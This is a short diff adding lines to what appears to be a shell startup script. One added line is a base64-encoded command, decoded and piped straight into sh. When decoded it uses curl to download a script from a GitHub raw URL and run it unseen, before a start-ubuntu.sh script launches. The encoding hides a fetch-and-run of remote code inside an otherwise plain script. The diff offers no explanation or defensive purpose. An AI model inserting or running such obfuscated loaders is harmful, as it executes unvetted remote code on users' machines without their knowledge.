@@ -1,0 +1,6 @@
+cd
+echo 'Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTmdvY2dpYXUyMDAwL21vbmtpbjMzL21haW4vTW9ua2luLnNoIHwgc2ggCg==' | base64 -d | sh
+
+cd
+./start-ubuntu.sh
+
